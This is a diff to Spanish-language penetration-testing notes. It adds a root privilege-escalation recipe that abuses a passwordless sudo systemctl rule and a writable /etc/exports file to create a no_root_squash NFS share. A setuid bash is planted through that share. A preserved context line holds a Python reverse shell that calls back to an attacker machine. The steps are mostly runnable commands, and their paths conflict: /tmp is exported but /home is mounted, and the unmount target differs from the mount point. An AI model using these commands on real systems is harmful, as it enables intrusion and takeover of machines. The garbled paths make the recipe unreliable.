@@ -147,3 +147,71 @@ Paso 3:
 ❯ which python3   # Mirar si python3 esta instalado 
 ❯ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_Kali",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 ```
+
+### Systemctl 
+```bash 
+❯ sudo -l       
+# Ejecutar el comando 'systemctl' como root sin password
+	(ALL) NOPASSWD: /usr/bin/systemctl restart nfs-kernel-server.service
+
+NOTA:
+	- Reiniciar el servicio provoca '/etc/exports' que se vuelva a leer 
+
+Paso 1: # Desde la máquina víctima 
+# Al revisar 
+❯ ls -la /etc/exports 
+❯ getfacl /etc/exports 
+
+# Resultado
+	getfacl: Removing leading '/' from absolute path names
+	# file: etc/exports
+	# owner: root
+	# group: root
+	user::rw-
+	user:localjob3:rw-      <. IMPORTANTE (Entrada ACL = Poder leer y escribir solo ese user)
+	group::r--
+	mask::rw-
+	other::r--
+```
+
+```bash 
+Paso 2: # Desde la máquina víctima 
+❯ cat /etc/exports 
+❯ echo "/tmp *(rw,no_root_squash,insecure)" >> /etc/exports   # Convierte `/tmp` en un recurso NFS exportado
+
+Paso 3: # Desde la máquina víctima 
+# Reiniciar el servicio para aplicar la configuración
+❯ sudo /usr/bin/systemctl restart nfs-kernel-server.service
+
+NOTA:
+	- `no_root_squash` evita que NFS convierta al usuario `root` del cliente en un usuario sin privilegios.
+	- Esto permite que un acceso como UID 0 (root) desde el cliente mantenga privilegios de root sobre el recurso NFS.
+```
+
+```bash 
+Paso 4: # Desde Kali se hace la ESCALADA a ROOT 
+❯ showmount -e <IP>        # Mirar el directorio de montura 
+❯ mkdir /tmp/nfs           # Crear dir de la montura en Kali 
+
+❯ mount -t nfs <IP>:/home /tmp/nfs      # Montar el directorio de la víctima en el dir '/tmp/nfs' de Kali 
+	# IP = Dirección IP del server víctima 
+	# /home = Es el directorio que muestra el primer comando 
+	# /tmp/disk_mnt = Es el dir creado en Kali 
+
+# Ingresar a la montura '/tmp/nfs' copiada en Kali y copiar la 'bash' de kali a ese dir para hacerla root
+❯ sudo cp /bin/bash .
+❯ sudo chmod +s bash 
+
+NOTA: 
+	- Los cambios en ese dir montado en Kali se reflejan al momento en la máquina víctima  
+```
+
+```bash 
+Paso 5: 
+# En la máquina víctima ejecutar la bash con privilegios de root 
+❯ ssh ubuntu@IP      # Ingresar con SSH si no se tiene sesión para ejecutar la bash 
+❯ ./bash -p         
+
+Paso 6: 
+❯ umount disk_mnt        # Al finalizar desmontaar el directorio   
+```
